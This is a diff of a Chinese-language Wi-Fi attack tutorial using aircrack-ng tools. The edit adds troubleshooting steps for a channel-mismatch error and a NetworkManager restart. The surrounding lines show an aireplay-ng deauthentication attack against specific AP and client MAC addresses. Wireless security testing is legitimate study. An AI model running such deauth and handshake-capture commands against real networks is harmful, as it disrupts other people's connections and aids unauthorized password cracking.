@@ -115,7 +115,20 @@ netcon@conwlt:~/workspace$ sudo airodump-ng -w android -c 6 --bssid 22:47:DA:62:
 ### 6. 使用 aireplay-ng 对目标设备发起攻击
 
 使用命令：`aireplay-ng -<攻击模式> <攻击次数> -a 无线 AP 硬件地址> -c <用户设备硬件地址> <处于监听模式的网卡名称>`
+===========================================================
+如果报错
+01:26:10  Waiting for beacon frame (BSSID: 74:0A:E1:28:73:20) on channel 7
+01:26:10  wlp2s0mon is on channel 7, but the AP uses channel 6
 
+执行以下三步
+sudo airmon-ng start wlan0
+
+sudo airodump-ng mon0
+
+sudo airmon-ng stop wlan0
+
+
+==============================================================
 ~~~
 netcon@conwlt:~$ sudo aireplay-ng -0 0 -a 22:47:DA:62:2A:F0 -c AC:BC:32:96:31:8D wlp8s0mon
 18:57:31  Waiting for beacon frame (BSSID: 22:47:DA:62:2A:F0) on channel 6
@@ -170,7 +183,7 @@ Reading packets, please wait...
 ### 8. 无线网卡退出监听模式
 
 使用命令：`airmon-ng stop <处于监听模式的无限网卡名称>`
-
+然后 service NetworkManager restart  # 这样才有wifi
 ~~~
 netcon@conwlt:~/workspace$ sudo airmon-ng stop wlp8s0mon
 
